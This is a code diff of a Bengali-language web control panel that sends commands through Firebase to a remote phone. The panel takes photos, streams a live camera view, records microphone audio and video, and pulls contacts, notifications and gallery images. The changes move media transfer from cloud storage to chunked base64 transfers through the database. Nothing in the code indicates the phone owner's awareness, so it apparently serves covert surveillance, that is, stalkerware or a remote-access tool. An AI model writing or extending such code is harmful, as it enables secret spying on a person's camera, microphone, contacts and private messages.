@@ -26,6 +26,7 @@
   .ph img{width:100%;height:100%;object-fit:cover;display:block}
   .tag{position:absolute;left:4px;top:4px;background:rgba(0,0,0,.6);font-size:10px;padding:2px 5px;border-radius:4px}
   .thumb-time{position:absolute;right:4px;bottom:4px;background:rgba(0,0,0,.6);font-size:10px;padding:2px 5px;border-radius:4px}
+  .ph button{position:absolute;bottom:6px;padding:4px 10px;font-size:12px}
   .badge{padding:3px 10px;border-radius:99px;font-size:12px;border:1px solid var(--line)}
   .badge.on{color:var(--ok);border-color:var(--ok)}
   .badge.off{color:var(--bad);border-color:var(--bad)}
@@ -38,10 +39,11 @@
   li .m{color:var(--dim);font-size:12px;margin-top:2px;display:flex;gap:8px;flex-wrap:wrap}
   table{width:100%;border-collapse:collapse;font-size:13px}
   td,th{border-bottom:1px solid var(--line);padding:7px 6px;text-align:left}
-  #liveImg{width:100%;border-radius:10px;border:1px solid var(--line);margin-top:10px;min-height:60px}
+  #liveImg{width:100%;border-radius:10px;border:1px solid var(--line);margin-top:10px;min-height:60px;background:#000}
   .rec{border:1px solid var(--line);border-radius:10px;padding:10px;margin-bottom:10px}
   .rec-head{font-size:13px;color:#cdd9e5;margin-bottom:8px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:6px}
   .rec video,.rec audio{width:100%;border-radius:6px}
+  .rec .dl{font-size:12px}
   #modal{position:fixed;inset:0;background:rgba(0,0,0,.87);display:flex;align-items:center;justify-content:center;z-index:50;cursor:zoom-out}
   #modal img{max-width:96vw;max-height:96vh;border-radius:8px}
   .hidden{display:none!important}
@@ -71,13 +73,12 @@
     <p class="dim">
       Firebase Console → ⚙️ <b>Project Settings</b> → <b>General</b> → আপনার Web অ্যাপ (<b>&lt;/&gt;</b> আইকন) →
       SDK setup থেকে <b>পুরো firebaseConfig</b> কপি করে নিচে পেস্ট করুন।
-      (apiKey, databaseURL, storageBucket, projectId, appId — সবগুলোই থাকতে হবে)
+      (apiKey, databaseURL, projectId, appId — এগুলো লাগবেই)
     </p>
     <textarea id="cfgRaw" placeholder='const firebaseConfig = {
   apiKey: "AIza...",
   databaseURL: "https://myproject-default-rtdb.asia-southeast1.firebasedatabase.app",
   projectId: "myproject",
-  storageBucket: "myproject.firebasestorage.app",
   messagingSenderId: "123456",
   appId: "1:123...:web:abc..."
 };'></textarea>
@@ -142,7 +143,7 @@
       </div>
       <img id="liveImg" class="hidden" alt="লাইভ ফ্রেম">
       <div id="liveTime" class="dim" style="margin-top:6px"></div>
-      <p class="dim" style="margin:8px 0 0">প্রতি কয়েক সেকেন্ডে ফ্রেম বদলায় — স্টোরেজে শুধু ১টি ফ্রেম থাকে, জমে না। ৩০ মিনিট পর নিজে থেমে যায় (চাইলে আবার চালু করুন)।</p>
+      <p class="dim" style="margin:8px 0 0">প্রতি কয়েক সেকেন্ডে ফ্রেম বদলায় — কোথাও জমে না। ৩০ মিনিট পর নিজে থেমে যায়। ফ্রি প্ল্যানের মাসিক ডাউনলোড সীমা বাঁচাতে দীর্ঘ সময় দেখলে ৫–১০ সেকেন্ড ইন্টারভাল রাখুন।</p>
     </section>
 
     <section class="card">
@@ -159,7 +160,7 @@
         <button id="btnAudioRec">🎙️ রেকর্ড শুরু</button>
         <button id="btnStopRec" class="ghost">⏹ চলমান রেকর্ডিং থামান</button>
       </div>
-      <p class="dim" style="margin:8px 0 0">ফোনের মাইক্রোফোন যা শুনছে তা রেকর্ড হয়ে নিচের তালিকায় জমা হবে।</p>
+      <p class="dim" style="margin:8px 0 0">ফোনের মাইক্রোফোন যা শুনছে তা নির্দিষ্ট সময় রেকর্ড হয় — শেষ হলে এখানেই চলে আসে।</p>
     </section>
 
     <section class="card">
@@ -171,26 +172,25 @@
         </select>
         <select id="videoDur">
           <option value="15">১৫ সেকেন্ড</option>
-          <option value="30">৩০ সেকেন্ড</option>
-          <option value="60" selected>১ মিনিট</option>
+          <option value="30" selected>৩০ সেকেন্ড</option>
+          <option value="60">১ মিনিট</option>
           <option value="120">২ মিনিট</option>
-          <option value="300">৫ মিনিট</option>
         </select>
         <button id="btnVideoRec">🎥 রেকর্ড শুরু</button>
       </div>
-      <p class="dim" style="margin:8px 0 0">৪৮০p ভিডিও (সাউন্ডসহ, অনুমতি থাকলে) — স্টোরেজ বাঁচাতে সর্বোচ্চ ৫ মিনিট।</p>
+      <p class="dim" style="margin:8px 0 0">৪৮০p ভিডিও (সাউন্ডসহ, অনুমতি থাকলে) — সর্বোচ্চ ২ মিনিট। ভিডিও ডাউনলোড হতে সাইজ অনুযায়ী কিছু সময় লাগতে পারে।</p>
     </section>
 
     <section class="card">
       <h2>📼 রেকর্ডিং তালিকা</h2>
       <div id="recList"></div>
-      <p class="dim empty" id="recEmpty">এখনো কোনো রেকর্ডিং নেই — উপরের বাটন থেকে অডিও/ভিডিও রেকর্ড করুন। (৩ দিনের বেশি পুরনোটা ফোন নিজেই মুছে দেয়)</p>
+      <p class="dim empty" id="recEmpty">এখনো কোনো রেকর্ডিং নেই। সর্বশেষ ৬টা রেকর্ডিং ফোনেই সেভ থাকে — তালিকা থেকে যেকোনোটা "চালান" চেপে আবার আনতে পারবেন।</p>
     </section>
 
     <section class="card">
       <h2>🖼️ তোলা ছবি</h2>
       <div id="photoGrid" class="grid"></div>
-      <p class="dim empty" id="photoEmpty">"ছবি তুলুন" বাটনে চাপলে ছবি এখানে আসবে।</p>
+      <p class="dim empty" id="photoEmpty">"ছবি তুলুন" বাটনে চাপলে ছবি এখানে আসবে। সর্বশেষ ২০টা ছবি ফোনেই থাকে — পুরনোগুলো "দেখুন" চেপে আবার আনা যায়।</p>
     </section>
 
     <section class="card">
@@ -222,7 +222,7 @@
         <button id="btnGallery">📥 গ্যালারির তালিকা আনুন (সর্বশেষ ১০০)</button>
       </div>
       <div id="galleryGrid" class="grid"></div>
-      <p class="dim empty" id="galleryEmpty">তালিকা আনলে প্রতিটি ছবির নিচে "দেখুন" বাটন পাবেন — চাপলে ফোন থেকে ক্লাউডে এসে দেখা যাবে।</p>
+      <p class="dim empty" id="galleryEmpty">তালিকা আনলে প্রতিটি ছবির নিচে "দেখুন" বাটন পাবেন — চাপলে ছবিটা ফোন থেকে এসে দেখা যাবে।</p>
     </section>
 
   </main>
@@ -242,7 +242,11 @@ let attachedDevice = null;
 let status = {};
 let deviceInfo = {};
 let contacts = [];
-let galleryTiles = {};
+let galleryTiles = {};         // mediaId -> tile
+let photoTiles = {};           // photoId -> tile
+let photoMem = {};             // photoId -> blob URL (এই সেশনে আনা)
+let recTiles = {};             // recId -> tile
+let recMem = {};               // recId -> blob URL
 let photoKeys = new Set();
 let recKeys = new Set();
 let notifKeys = new Set();
@@ -373,6 +377,54 @@ function sendCmd(action, args) {
   toast('📤 কমান্ড পাঠানো হয়েছে…');
 }
 
+// ---------------- চাংক ট্রান্সফার (Storage ছাড়াই) ----------------
+
+function b64ToBlob(b64, mime) {
+  const bin = atob(b64);
+  const u8 = new Uint8Array(bin.length);
+  for (let i = 0; i < bin.length; i++) u8[i] = bin.charCodeAt(i);
+  return new Blob([u8], { type: mime || 'application/octet-stream' });
+}
+
+/**
+ * ফোন RTDB-তে chunks/0..n লিখে meta দেয়। এখানে সেগুলো জোড়া লাগিয়ে Blob বানাই,
+ * ack পাঠাই (ফোন তখন চাংক মুছে দেয়) এবং blob URL কলব্যাকে দিই।
+ */
+function startTransfer(transferId, cb, failMsg) {
+  if (!FB || !attachedDevice) return;
+  const { ref, onValue, off, set } = FB.api;
+  const tRef = ref(FB.db, 'devices/' + attachedDevice + '/transfers/' + transferId);
+
+  const timer = setTimeout(() => {
+    off(tRef, 'value', handler);
+    toast(failMsg || '❌ ট্রান্সফার সময়ের মধ্যে শেষ হয়নি');
+  }, 300000);
+
+  const handler = onValue(tRef, (s) => {
+    const v = s.val() || {};
+    const meta = v.meta;
+    const chunks = v.chunks;
+    if (!meta || !chunks) return;
+    const total = meta.total || 0;
+    const keys = Object.keys(chunks);
+    if (keys.length < total) return; // সব চাংক এখনো আসেনি
+
+    clearTimeout(timer);
+    off(tRef, 'value', handler);
+
+    let b64 = '';
+    for (let i = 0; i < total; i++) b64 += chunks[String(i)] || '';
+    const blob = b64ToBlob(b64, meta.mime);
+    const url = URL.createObjectURL(blob);
+
+    // ফোনকে ধন্যবাদ জানাই — চাংকগুলো মুছে ফেলতে
+    set(ref(FB.db, 'devices/' + attachedDevice + '/transfers/' + transferId + '/ack'), true)
+      .catch(() => {});
+
+    cb(url, meta);
+  });
+}
+
 // ---------------- ডিভাইস লিসেনার ----------------
 
 function detachAll() {
@@ -385,7 +437,10 @@ function detachAll() {
 
 function clearDeviceUI() {
   photoKeys.clear(); recKeys.clear(); notifKeys.clear();
-  status = {}; deviceInfo = {}; contacts = []; galleryTiles = {};
+  Object.values(photoMem).forEach((u) => URL.revokeObjectURL(u));
+  Object.values(recMem).forEach((u) => URL.revokeObjectURL(u));
+  status = {}; deviceInfo = {}; contacts = {};
+  galleryTiles = {}; photoTiles = {}; recTiles = {}; photoMem = {}; recMem = {};
   lastLiveAt = 0;
   $('photoGrid').innerHTML = '';
   $('recList').innerHTML = '';
@@ -454,29 +509,26 @@ function attachDeviceListeners() {
     deviceInfo = s.val() || {};
     updateStatusUI();
   }));
-  devUnsubs.push(onChildAdded(query(ref(FB.db, base + '/photos'), limitToLast(60)), (s) => {
-    addPhoto(s.val(), s.key);
+  devUnsubs.push(onChildAdded(query(ref(FB.db, base + '/photos'), limitToLast(40)), (s) => {
+    addPhotoTile(s.val(), s.key);
   }));
-  devUnsubs.push(onChildAdded(query(ref(FB.db, base + '/recordings'), limitToLast(30)), (s) => {
-    addRecording(s.val(), s.key);
+  devUnsubs.push(onChildAdded(query(ref(FB.db, base + '/recordings'), limitToLast(20)), (s) => {
+    addRecTile(s.val(), s.key);
   }));
   devUnsubs.push(onChildAdded(query(ref(FB.db, base + '/notifications'), limitToLast(100)), (s) => {
     addNotif(s.val(), s.key);
   }));
-  devUnsubs.push(onValue(ref(FB.db, base + '/live/latest'), (s) => {
+  devUnsubs.push(onValue(ref(FB.db, base + '/live'), (s) => {
     const v = s.val();
-    if (v && v.url) {
-      lastLiveAt = v.at || Date.now();
-      // ব্রাউজার-ক্যাশ বাইপাস করতে টাইমস্ট্যাম্প যোগ করি
-      $('liveImg').src = v.url + (v.url.includes('?') ? '&' : '?') + 't=' + lastLiveAt;
-      $('liveImg').classList.remove('hidden');
-    }
-  }));
-  const autoStopRef = ref(FB.db, base + '/live/autoStopped');
-  devUnsubs.push(onValue(autoStopRef, (s) => {
-    if (s.val() === true) {
+    if (!v) return;
+    if (v.autoStopped === true) {
       toast('⏹ ৩০ মিনিট শেষ — লাইভ ভিউ বন্ধ হয়েছে (আবার চালু করতে পারেন)');
-      try { FB.api.remove(autoStopRef); } catch (e) {}
+      try { FB.api.remove(ref(FB.db, base + '/live/autoStopped')); } catch (e) {}
+    }
+    if (v.frame) {
+      lastLiveAt = v.at || Date.now();
+      $('liveImg').src = 'data:image/jpeg;base64,' + v.frame;
+      $('liveImg').classList.remove('hidden');
     }
   }));
   devUnsubs.push(onChildAdded(query(ref(FB.db, base + '/results'), limitToLast(25)), (s) => {
@@ -511,48 +563,118 @@ function updateStatusUI() {
   }
 }
 
-function addPhoto(v, key) {
-  if (!v || !v.url || photoKeys.has(key)) return;
+// ---- ছবির টাইল ----
+
+function addPhotoTile(v, key) {
+  if (!v || photoKeys.has(key)) return;
   photoKeys.add(key);
   $('photoEmpty').style.display = 'none';
   const d = document.createElement('div');
   d.className = 'ph';
-  const img = document.createElement('img');
-  img.src = v.url; img.loading = 'lazy'; img.alt = '';
-  d.appendChild(img);
-  const tag = document.createElement('span');
-  tag.className = 'tag';
-  tag.textContent = (v.cam === 'front' ? 'ফ্রন্ট' : 'ব্যাক');
-  d.appendChild(tag);
-  const tm = document.createElement('span');
-  tm.className = 'thumb-time';
-  tm.textContent = v.at ? new Date(v.at).toLocaleTimeString() : '';
-  d.appendChild(tm);
-  d.onclick = () => { $('modalImg').src = v.url; $('modal').classList.remove('hidden'); };
+  photoTiles[key] = d;
+  fillPhotoTile(d, key, v);
   $('photoGrid').prepend(d);
-  while ($('photoGrid').children.length > 60) $('photoGrid').removeChild($('photoGrid').lastChild);
+  while ($('photoGrid').children.length > 40) {
+    const last = $('photoGrid').lastChild;
+    if (last) {
+      const k = Object.keys(photoTiles).find((x) => photoTiles[x] === last);
+      if (k) delete photoTiles[k];
+      $('photoGrid').removeChild(last);
+    }
+  }
 }
 
-function addRecording(v, key) {
-  if (!v || !v.url || recKeys.has(key)) return;
+function fillPhotoTile(d, key, meta) {
+  d.innerHTML = '';
+  if (photoMem[key]) {
+    const img = document.createElement('img');
+    img.src = photoMem[key]; img.alt = '';
+    d.appendChild(img);
+    d.onclick = () => { $('modalImg').src = photoMem[key]; $('modal').classList.remove('hidden'); };
+  } else {
+    const label = document.createElement('div');
+    label.className = 'dim';
+    label.style.textAlign = 'center';
+    label.style.fontSize = '11px';
+    label.style.padding = '6px';
+    label.textContent = '🗓️ ' + (meta.at ? new Date(meta.at).toLocaleString() : '');
+    d.appendChild(label);
+    const btn = document.createElement('button');
+    btn.textContent = 'দেখুন';
+    btn.onclick = (e) => {
+      e.stopPropagation();
+      sendCmd('get_stored_photo', { id: key });
+      toast('ছবি আসছে…');
+    };
+    d.appendChild(btn);
+  }
+  if (meta.cam) {
+    const tag = document.createElement('span');
+    tag.className = 'tag';
+    tag.textContent = meta.cam === 'front' ? 'ফ্রন্ট' : 'ব্যাক';
+    d.appendChild(tag);
+  }
+}
+
+function photoArrived(photoId, url) {
+  photoMem[photoId] = url;
+  const meta = { at: Date.now() };
+  if (photoTiles[photoId]) fillPhotoTile(photoTiles[photoId], photoId, meta);
+}
+
+// ---- রেকর্ডিং টাইল ----
+
+function addRecTile(v, key) {
+  if (!v || recKeys.has(key)) return;
   recKeys.add(key);
   $('recEmpty').style.display = 'none';
   const d = document.createElement('div');
   d.className = 'rec';
+  recTiles[key] = d;
+  fillRecTile(d, key, v);
+  $('recList').prepend(d);
+  while ($('recList').children.length > 20) {
+    const last = $('recList').lastChild;
+    if (last) {
+      const k = Object.keys(recTiles).find((x) => recTiles[x] === last);
+      if (k) delete recTiles[k];
+      $('recList').removeChild(last);
+    }
+  }
+}
+
+function fillRecTile(d, key, meta) {
+  d.innerHTML = '';
   const head = document.createElement('div');
   head.className = 'rec-head';
-  const durTxt = v.durSec ? (v.durSec < 60 ? v.durSec + ' সেকেন্ড' : (v.durSec / 60) + ' মিনিট') : '';
-  head.textContent = (v.type === 'audio' ? '🎙️ অডিও' : '🎥 ভিডিও' + (v.cam === 'front' ? ' (ফ্রন্ট)' : ' (ব্যাক)')) +
-    ' · ' + durTxt + ' · ' + (v.at ? new Date(v.at).toLocaleString() : '');
+  const durTxt = meta.durSec ? (meta.durSec < 60 ? meta.durSec + ' সেকেন্ড' : (meta.durSec / 60) + ' মিনিট') : '';
+  head.textContent = (meta.type === 'audio' ? '🎙️ অডিও' : '🎥 ভিডিও' + (meta.cam === 'front' ? ' (ফ্রন্ট)' : ' (ব্যাক)')) +
+    ' · ' + durTxt + ' · ' + (meta.at ? new Date(meta.at).toLocaleString() : '');
   d.appendChild(head);
-  const el = document.createElement(v.type === 'audio' ? 'audio' : 'video');
-  el.controls = true;
-  el.preload = 'metadata';
-  el.src = v.url;
-  d.appendChild(el);
-  $('recList').prepend(d);
-  while ($('recList').children.length > 30) $('recList').removeChild($('recList').lastChild);
+
+  if (recMem[key]) {
+    const el = document.createElement(meta.type === 'audio' ? 'audio' : 'video');
+    el.controls = true;
+    el.preload = 'metadata';
+    el.src = recMem[key];
+    d.appendChild(el);
+  } else {
+    const btn = document.createElement('button');
+    btn.textContent = meta.type === 'audio' ? '▶ চালান (ডাউনলোড)' : '▶ চালান (ডাউনলোড)';
+    btn.onclick = () => {
+      sendCmd('get_stored_rec', { id: key });
+      toast('রেকর্ডিং আসছে… (সাইজ অনুযায়ী সময় লাগতে পারে)');
+    };
+    d.appendChild(btn);
+  }
 }
+
+function recArrived(recId, url, meta) {
+  recMem[recId] = url;
+  if (recTiles[recId]) fillRecTile(recTiles[recId], recId, meta || {});
+}
+
+// ---- নোটিফিকেশন ----
 
 function addNotif(v, key) {
   if (!v || notifKeys.has(key)) return;
@@ -574,6 +696,8 @@ function addNotif(v, key) {
   while ($('notifList').children.length > 100) $('notifList').removeChild($('notifList').lastChild);
 }
 
+// ---- কমান্ডের ফলাফল ----
+
 function handleResult(v, key) {
   if (!v) return;
   const fresh = !seenResults.has(key);
@@ -584,31 +708,52 @@ function handleResult(v, key) {
   }
   switch (v.action) {
     case 'take_photo':
-      if (fresh) toast('✅ ছবি এসে গেছে (নিচের গ্রিডে দেখুন)');
+      if (fresh) toast('📸 ছবি তোলা হয়েছে — আসছে…');
+      startTransfer(v.transfer, (url) => {
+        photoArrived(v.photoId, url);
+        toast('✅ ছবি এসে গেছে');
+      }, '❌ ছবি আসেনি');
       break;
-    case 'start_live':
-      if (fresh) toast('🔴 লাইভ ভিউ চালু হয়েছে');
+
+    case 'get_stored_photo':
+      startTransfer(v.transfer, (url) => {
+        photoArrived(v.photoId, url);
+        toast('✅ ছবি এসে গেছে');
+      }, '❌ ছবি আসেনি');
       break;
-    case 'stop_live':
-      if (fresh) toast('⏹ লাইভ ভিউ বন্ধ হয়েছে');
-      break;
+
     case 'record_audio':
-      if (fresh) toast('✅ অডিও রেকর্ড হয়ে সেভ হয়েছে — রেকর্ডিং তালিকায় দেখুন');
-      break;
     case 'record_video':
-      if (fresh) toast('✅ ভিডিও রেকর্ড হয়ে সেভ হয়েছে — রেকর্ডিং তালিকায় দেখুন');
+      if (fresh) toast('✅ রেকর্ডিং শেষ — ফাইল আসছে…');
+      startTransfer(v.transfer, (url) => {
+        recArrived(v.recId, url, { type: v.action === 'record_audio' ? 'audio' : 'video', durSec: v.durSec });
+        toast('✅ রেকর্ডিং এসে গেছে');
+      }, '❌ রেকর্ডিং আসেনি');
       break;
+
+    case 'get_stored_rec':
+      startTransfer(v.transfer, (url, meta) => {
+        recArrived(v.recId, url, {});
+        toast('✅ রেকর্ডিং এসে গেছে');
+      }, '❌ রেকর্ডিং আসেনি');
+      break;
+
     case 'get_image':
-      if (v.mediaId != null && galleryTiles[v.mediaId]) {
-        const tile = galleryTiles[v.mediaId];
-        tile.innerHTML = '';
-        const img = document.createElement('img');
-        img.src = v.url; img.loading = 'lazy'; img.alt = '';
-        tile.appendChild(img);
-        tile.onclick = () => { $('modalImg').src = v.url; $('modal').classList.remove('hidden'); };
-        if (fresh) toast('✅ ছবি এসে গেছে');
-      }
+      startTransfer(v.transfer, (url) => {
+        if (galleryTiles[v.mediaId]) {
+          const tile = galleryTiles[v.mediaId];
+          tile.innerHTML = '';
+          const img = document.createElement('img');
+          img.src = url; img.alt = '';
+          tile.appendChild(img);
+          tile.onclick = () => { $('modalImg').src = url; $('modal').classList.remove('hidden'); };
+        }
+        $('modalImg').src = url;
+        $('modal').classList.remove('hidden');
+        toast('✅ ছবি এসে গেছে');
+      }, '❌ ছবি আসেনি');
       break;
+
     case 'get_contacts':
       try { contacts = JSON.parse(v.data || '[]'); } catch (e) { contacts = []; }
       $('contactsWrap').classList.remove('hidden');
@@ -616,11 +761,14 @@ function handleResult(v, key) {
       $('contactsCount').textContent = 'মোট ' + contacts.length + ' টি কন্টাক্ট';
       renderContacts();
       break;
-    case 'get_gallery':
+
+    case 'get_gallery': {
       let items = [];
       try { items = JSON.parse(v.data || '[]'); } catch (e) {}
       renderGallery(items);
       break;
+    }
+
     case 'device_info': {
       let d = {};
       try { d = JSON.parse(v.data || '{}'); } catch (e) {}
@@ -628,6 +776,13 @@ function handleResult(v, key) {
         ' · ব্যাটারি ' + (d.battery != null ? d.battery : '?') + '%');
       break;
     }
+
+    case 'start_live':
+      if (fresh) toast('🔴 লাইভ ভিউ চালু হয়েছে');
+      break;
+    case 'stop_live':
+      if (fresh) toast('⏹ লাইভ ভিউ বন্ধ হয়েছে');
+      break;
   }
 }
 
@@ -662,10 +817,6 @@ function renderGallery(items) {
     d.appendChild(label);
     const btn = document.createElement('button');
     btn.textContent = 'দেখুন';
-    btn.style.position = 'absolute';
-    btn.style.bottom = '6px';
-    btn.style.padding = '4px 10px';
-    btn.style.fontSize = '12px';
     btn.onclick = (e) => {
       e.stopPropagation();
       sendCmd('get_image', { mediaId: it.id });
@@ -697,14 +848,16 @@ showState();
   if (!cfg) return;
 
   try {
-    const app = A.initializeApp({
+    const init = {
       apiKey: cfg.apiKey,
       databaseURL: cfg.databaseURL,
       projectId: cfg.projectId,
-      storageBucket: cfg.storageBucket,
-      messagingSenderId: cfg.messagingSenderId,
       appId: cfg.appId
-    });
+    };
+    if (cfg.messagingSenderId) init.messagingSenderId = cfg.messagingSenderId;
+    if (cfg.storageBucket) init.storageBucket = cfg.storageBucket;
+
+    const app = A.initializeApp(init);
     FB = {
       app: app,
       auth: AU.getAuth(app),
@@ -724,5 +877,5 @@ showState();
   }
 })();
 </script>
-</body>
+<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a3d74b7c59723f11',t:'MTc4OTgwNzMyMw=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
